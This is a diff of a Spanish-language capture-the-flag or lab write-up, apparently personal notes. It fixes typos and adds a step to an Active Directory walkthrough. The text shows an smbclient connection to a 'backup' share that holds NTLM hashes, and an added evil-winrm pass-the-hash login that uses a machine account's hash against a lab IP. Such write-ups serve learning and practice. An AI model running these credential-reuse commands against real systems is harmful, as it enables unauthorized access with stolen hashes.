@@ -102,12 +102,17 @@ SYSVOL          READ            Logon server share
 Users                           
 ```
 
-Vemos el recurso compartido de `backup` que tenemos permisos de lectura sobre el procedemos a ver su contenido, dentro de el encontramoms un archvio con hashes `NTLM`
+Vemos el recurso compartido de `backup` que tenemos permisos de lectura sobre el procedemos a ver su contenido, dentro de el encontramos un archivo con hashes `NTLM`
 
 ```shell
 smbclient -U 'file_svc' //10.114.135.170/backup
 ```
 
+
+Y nos podemos conectar con [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.114.135.170 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
+```
 
 
 
